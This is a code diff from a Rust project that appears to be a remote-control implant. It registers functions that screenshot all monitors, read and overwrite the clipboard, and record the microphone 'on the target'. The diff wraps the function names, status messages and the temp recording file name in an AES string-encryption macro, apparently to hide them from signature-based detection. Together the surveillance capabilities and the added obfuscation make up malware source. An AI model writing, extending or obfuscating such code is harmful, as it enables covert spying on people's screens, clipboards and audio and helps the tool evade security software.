@@ -6,13 +6,15 @@ use image::ImageOutputFormat;
 use arboard::Clipboard;
 use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
 use crate::utils;
+use crate::strcrypt_rt;
+use strcrypt::aes_str;
 
 pub fn register(engine: &mut Engine) {
 
     // ── Screenshot ────────────────────────────────────────────────────────────
     // Returns a JSON array: [{monitor_index, width, height, b64}]
 
-    engine.register_fn("internal_screenshot", || -> String {
+    engine.register_fn(&aes_str!("internal_screenshot"), || -> String {
         let screens  = Screen::all().unwrap_or_default();
         let mut results = Vec::new();
         for (i, screen) in screens.iter().enumerate() {
@@ -34,27 +36,27 @@ pub fn register(engine: &mut Engine) {
 
     // ── Clipboard ─────────────────────────────────────────────────────────────
 
-    engine.register_fn("internal_clipboard_get", || -> String {
+    engine.register_fn(&aes_str!("internal_clipboard_get"), || -> String {
         match Clipboard::new() {
             Ok(mut cb) => cb.get_text().unwrap_or_else(|e| format!("[Empty/Image] {}", e)),
             Err(e)     => format!("Clipboard Init Error: {}", e),
         }
     });
 
-    engine.register_fn("internal_clipboard_set", |text: &str| -> String {
+    engine.register_fn(&aes_str!("internal_clipboard_set"), |text: &str| -> String {
         match Clipboard::new() {
             Ok(mut cb) => match cb.set_text(text) {
-                Ok(_)  => "Success".into(),
+                Ok(_)  => aes_str!("Success"),
                 Err(e) => format!("Set Error: {}", e),
             },
             Err(e) => format!("Clipboard Init Error: {}", e),
         }
     });
 
-    engine.register_fn("internal_clipboard_clear", || -> String {
+    engine.register_fn(&aes_str!("internal_clipboard_clear"), || -> String {
         match Clipboard::new() {
             Ok(mut cb) => match cb.clear() {
-                Ok(_)  => "Clipboard Cleared".into(),
+                Ok(_)  => aes_str!("Clipboard Cleared"),
                 Err(e) => format!("Clear Error: {}", e),
             },
             Err(e) => format!("Clipboard Init Error: {}", e),
@@ -66,9 +68,9 @@ pub fn register(engine: &mut Engine) {
     // or `ffmpeg -f dshow` (Windows) on the target. Returns base64 WAV on
     // success; a descriptive error string if the tool is absent.
 
-    engine.register_fn("internal_mic_record", |seconds: i64| -> String {
+    engine.register_fn(&aes_str!("internal_mic_record"), |seconds: i64| -> String {
         let secs  = seconds.max(1).min(300);
-        let tmp   = std::env::temp_dir().join("rcm_mic.wav");
+        let tmp   = std::env::temp_dir().join(aes_str!("rcm_mic.wav"));
         let tmp_s = tmp.to_string_lossy().to_string();
 
         let record_cmd = match std::env::consts::OS {
